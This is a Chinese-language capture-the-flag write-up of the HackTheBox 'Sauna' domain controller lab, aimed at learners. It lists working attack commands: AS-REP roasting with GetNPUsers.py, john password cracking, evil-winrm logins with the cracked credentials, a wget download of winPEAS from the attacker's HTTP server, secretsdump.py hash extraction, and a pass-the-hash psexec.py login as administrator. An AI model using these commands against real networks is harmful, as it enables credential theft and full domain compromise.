## 靶机信息

靶机地址:

```
 https://app.hackthebox.com/machines/Sauna
```

靶场: HackTheBox.com

靶机名称: Sauna

难度: 简单

提示信息:

```
 无
```

目标: user.txt和root.txt

## 实验环境

```
 攻击机:Manjaro 10.10.16.4
靶机:10.10.10.175
```

## 信息收集

### 扫描端口

扫描靶机开放的服务端口

```
 sudo nmap \-p- \-T4 \-sS 10.10.10.175
```

![](../Images/a0104ca920b2eda6f4b7e9a0ac17c2d5.png)

```
 sudo nmap \-sC \-sV \-p 80,88,139,445,389,593,636 10.10.10.175 \-oN nmap.log
```

![](../Images/a6990ee40bc9d41da0379a019052a9ef.png)

从扫描结果中看到80端口在IIS服务下；主机开启53、88、389等端口可以判断出靶机为域控主机；389端口探测出域名为EGOTISTICAL-BANK.LOCAL，先来看看80端口

## Web渗透

![](../Images/894a69452c21a47be574de2b2fecccec.png)

访问后发现有多个链接，需要逐一查看

![](../Images/1f1efefa93585d19baba3a79c2917125.png)

查看页面后发现均为静态页面，但是在about.html页面中发现团队成员的名字，可以收集做为用户账号

按照账号命名规范和名字缩写简单组合起来

```
 vim user.txt
```

![](../Images/9ebd3776389db42381e87c42bc2a187e.png)

做个目录扫描

```
 dirsearch \-u http://10.10.10.175 \-t 10
```

![](../Images/c57d77eb3c0d8041d74704a3fba019f2.png)

目录扫描同时检测下其他端口（目录扫描未发现敏感信息）

smbmap使用空账号获取共享目录（未能获取到共享目录）

```
 smbmap \-H 10.10.10.175 \-u '' \-p ''
```

![](../Images/04a5d51635acbd0a1f138de262fc4af7.png)

rpcclient空账号登录（同样失败）

```
 rpcclient 10.10.10.175 \-U ""
```

![](../Images/23b111cb54b8a141381b3f22863ea54c.png)

## 域渗透

尝试获取“不要求Kerberos预身份验证”的Hash值

```
 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ \-usersfile user.txt \-dc-ip 10.10.10.175
```

![](../Images/9e74a1fa99e763836959ba0afea9afbc.png)

拿到FSmith账号的密码Hash，尝试暴破

```
 john fsmith\_hash.txt \-w\=../../Dict/rockyou.txt
```

![](../Images/8bf92d9522489f0c9db71335f57cb928.png)

暴破到FSmith的密码为Thestrokes23，尝试登录

```
 evil-winrm \-i 10.10.10.175 \-u fsmith \-p Thestrokes23
```

![](../Images/128bd138bd1871296c05e1e281fe3746.png)

登录成功，收集信息

```
 cd ../Desktop
ls
type root.txt
```

![](../Images/c382f4372b8a19713bdb9bf0e4d18fbf.png)

在用户桌面上拿到user.txt中的flag，继续收集

上传辅助提权工具

1。攻击机在辅助提权工具目录下开启HTTP服务

```
 py3 \-m http.server
```

![](../Images/ec5907a94906d6bd2a7783ef461d6ba2.png)

2。靶机下载winPEASx64.exe

```
 cd \\
mkdir tmp
cd tmp
wget http://10.10.16.3:8000/winPEASx64.exe \-o wp.exe
./wp.exe
```

![](../Images/d5a2785b48f52465d5fea753e1ef31ba.png)

![](../Images/c0231fab873a084d0ccc21b1c37b51e0.png)

发现自动登录凭证中的账号密码，然而在用户列表中并未发现此用户账号，有一个较为相似的账号svc\_loanmgr

![](../Images/e6e3ea31da69475ddec7b6652474eb9f.png)

发现两个账号HSmith与svc\_loanmgr，查看svc\_loanmgr用户信息

![](../Images/445748e45ccea095844b01cc5f127895.png)

发现svc\_loanmgr同样有远程登录权限，尝试使用密码Moneymakestheworldgoround!登录

```
 evil-winrm \-i 10.10.10.175 \-u svc\_loanmgr \-p Moneymakestheworldgoround!
```

![](../Images/61a514c20883baa82733519ddedfcafe.png)

登录成功，但是并未发现有何特殊权限和敏感信息

### 转存用户密码Hash

通过Impacket中的secretsdump.py脚本提取Hash

```
 secretsdump.py EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23@10.10.10.175
```

![](../Images/83298b76e17eb3d98f6f72d4c8c983df.png)

转存失败，更换另一个账号

```
 secretsdump.py EGOTISTICAL-BANK.LOCAL/svc\_loanmgr:Moneymakestheworldgoround\\\\!@10.10.10.175
```

![](../Images/7a67aef1c236a71763dd4a8026ca2d9c.png)

提取到administrator管理员密码Hash（由于感叹号导致后面的参数无法执行添加双\\来转义，后面试了一下也可以用引号将全部参数包起来）

使用Impacket中的psexec.py登录靶机

```
 psexec.py administrator@10.10.10.175 \-hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

![](../Images/c638a3eb04b85a2c86c6d7ba52eb1315.png)

登录成功，来找下flag

```
 cd c:\\users\\administrator
tree /f
type desktop\\root.txt
```

![](../Images/f494237b745ca3f4d860fff105f58c70.png)

![](../Images/963fd956e2abc4326c765e5df4d197cc.png)

拿到root.txt，游戏结束

![](../Images/8f2ba652c046791b004131256637ca68.png)
